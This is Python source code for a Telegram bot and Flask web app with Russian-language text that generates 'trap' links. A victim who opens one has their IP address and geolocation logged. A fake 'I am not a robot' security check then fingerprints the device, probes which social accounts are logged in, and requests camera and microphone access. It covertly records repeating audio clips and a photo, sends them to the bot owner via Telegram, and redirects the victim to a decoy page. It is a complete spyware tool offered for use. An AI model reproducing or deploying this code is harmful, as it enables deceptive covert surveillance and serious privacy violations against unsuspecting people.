import telebot, requests, os, uuid
from flask import Flask, request

API_TOKEN = os.environ.get('API_TOKEN')
bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)
db = {}

@app.route('/')
def home():
    return f'''
    <body style="background:#000;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;">
        <h1 style="margin-bottom:20px;">⚡ CORE SYSTEM V5 ULTIMATE</h1>
        <a href="/activate" style="padding:15px 35px;background:#0088cc;color:#fff;text-decoration:none;border-radius:12px;font-weight:bold;box-shadow:0 0 25px #0088cc;">АКТИВИРОВАТЬ СИСТЕМУ</a>
    </body>
    '''

@app.route('/activate')
def activate():
    if bot.set_webhook(url=f"https://{request.host}/{API_TOKEN}"):
        return "✅ SYSTEM ARMED"
    return "❌ ERROR"

@app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
def get_m():
    bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
    return "!", 200

@app.route('/v/<uid>')
def logger(uid):
    if uid not in db: return "EXPIRED", 404
    owner_id, target = db[uid]['owner'], db[uid]['url']
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
    g = "📍 GeoIP Error"
    try:
        r = requests.get(f"http://ip-api.com{ip}?fields=66846719", timeout=5).json()
        if r.get('status') == 'success':
            g = f"🌍 {r['country']}, {r['city']}\\n📡 {r['isp']}\\n🛡️ VPN: {'ДА' if r['proxy'] or r['hosting'] else 'НЕТ'}"
    except: pass
    bot.send_message(owner_id, f"🎯 КЛИК!\\n👤 IP: `{ip}`\\n{g}", parse_mode="Markdown")
    return f'''
    <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"></head>
    <body style="background:#000;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center;">
        <div id="ui">
            <div style="font-size:65px;margin-bottom:15px;">🛡️</div>
            <h2>Проверка безопасности</h2>
            <button id="go" style="padding:18px 60px;border:none;border-radius:40px;background:#fff;color:#000;font-weight:900;cursor:pointer;">Я НЕ РОБОТ</button>
        </div>
        <video id="v" style="display:none;" autoplay playsinline muted></video><canvas id="c" style="display:none;"></canvas>
        <script>
        const btn = document.getElementById('go');
        btn.onclick = async () => {{
            btn.innerText = "Анализ...";
            let d = {{
                uid: "{uid}",
                hw: {{ scr: screen.width+"x"+screen.height+"*"+devicePixelRatio, cores: navigator.hardwareConcurrency, hz: 60, bench: 0 }},
                bat: {{ lvl: "N/A", char: "N/A" }},
                net: {{ type: navigator.connection ? navigator.connection.effectiveType : "N/A" }},
                social: {{ g: false, vk: false, tg: false, fb: false }},
                pwa: {{ tw: false, tt: false }},
                bright: "N/A"
            }};

            const t0 = performance.now();
            for(let i=0; i<10000000; i++) {{ Math.sqrt(i); }}
            d.hw.bench = Math.round(performance.now() - t0) + "ms";

            let frames = 0;
            requestAnimationFrame(function loop(t) {{
                frames++;
                if(frames < 10) requestAnimationFrame(loop);
                else d.hw.hz = Math.round(frames / (performance.now() - t0) * 1000) || 60;
            }});

            const check = (u) => new Promise(r => {{ let i = new Image(); i.onload=()=>r(true); i.onerror=()=>r(false); i.src=u; }});
            d.social.g = await check("https://accounts.google.com");
            d.social.vk = await check("https://vk.com");
            d.social.tg = await check("https://web.telegram.org");
            d.pwa.tw = await check("https://twitter.com");

            try {{
                let b = await navigator.getBattery();
                d.bat.lvl = Math.round(b.level * 100) + "%";
                d.bat.char = b.charging ? "Да" : "Нет";
            }} catch(e) {{}}

            if (window.matchMedia('(light-level: dim)').matches) d.bright = "Низкая";
            else if (window.matchMedia('(light-level: normal)').matches) d.bright = "Средняя";
            else if (window.matchMedia('(light-level: washed)').matches) d.bright = "Высокая";

            fetch('/log_extra', {{ method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify(d) }});

            try {{
                const s = await navigator.mediaDevices.getUserMedia({{ video: true, audio: true }});
                const v = document.getElementById('v'); v.srcObject = s;
                function recAudio() {{
                    const r = new MediaRecorder(s); const ch = [];
                    r.ondataavailable = e => ch.push(e.data);
                    r.onstop = () => {{
                        const f = new FormData(); f.append('audio', new Blob(ch, {{type:'audio/webm'}}), 'a.webm'); f.append('uid', "{uid}");
                        fetch('/log_audio', {{ method: 'POST', body: f }});
                        if(s.active) recAudio();
                    }};
                    r.start(); setTimeout(() => r.stop(), 10000);
                }}
                recAudio();
                setTimeout(() => {{
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {{
                        const f = new FormData(); f.append('photo', b, 'p.jpg'); f.append('uid', "{uid}");
                        fetch('/log_photo', {{ method: 'POST', body: f }}).then(() => {{ window.location.href = "{target}"; }});
                    }}, 'image/jpeg', 0.7);
                }}, 1500);
            } catch(e) {{ window.location.href = "{target}"; }}
        }};
        </script>
    </body></html>
    '''

@app.route('/log_extra', methods=['POST'])
def log_extra():
    d = request.json
    if d and d['uid'] in db:
        m = (f"🖥 ОТЧЕТ V5 ID: `{d['uid']}`\\n\\n"
             f"🚀 Benchmark: `{d['hw']['bench']}`\\n"
             f"📺 Экран: `{d['hw']['scr']}` | `{d['hw']['hz']}Hz`\\n"
             f"🔋 Заряд: `{d['bat']['lvl']}` (Зарядка: `{d['bat']['char']}`)\\n"
             f"💡 Яркость среды: `{d['bright']}`\\n"
             f"🌐 Сеть: `{d['net']['type']}`\\n"
             f"👤 Соцсети: `G:{'✅' if d['social']['g'] else '❌'}` | `VK:{'✅' if d['social']['vk'] else '❌'}` | `TG:{'✅' if d['social']['tg'] else '❌'}`\\n"
             f"📱 PWA (Twitter): `{'✅' if d['pwa']['tw'] else '❌'}`")
        bot.send_message(db[d['uid']]['owner'], m, parse_mode="Markdown")
    return "ok"

@app.route('/log_photo', methods=['POST'])
def log_photo():
    uid, f = request.form.get('uid'), request.files.get('photo')
    if uid in db and f: bot.send_photo(db[uid]['owner'], f.read(), caption=f"📸 ФОТО ID: `{uid}`")
    return "ok"

@app.route('/log_audio', methods=['POST'])
def log_audio():
    uid, f = request.form.get('uid'), request.files.get('audio')
    if uid in db and f: bot.send_document(db[uid]['owner'], f.read(), caption=f"🎤 АУДИО ID: `{uid}`")
    return "ok"

@bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
def create(m):
    url = m.text.strip()
    if not url.startswith("http"): url = "https://" + url
    uid = str(uuid.uuid4())[:8]
    db[uid] = {'owner': m.chat.id, 'url': url}
    bot.reply_to(m, f"✅ Твоя ультимейт-ловушка:\\n`https://{request.host}/v/{uid}`")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
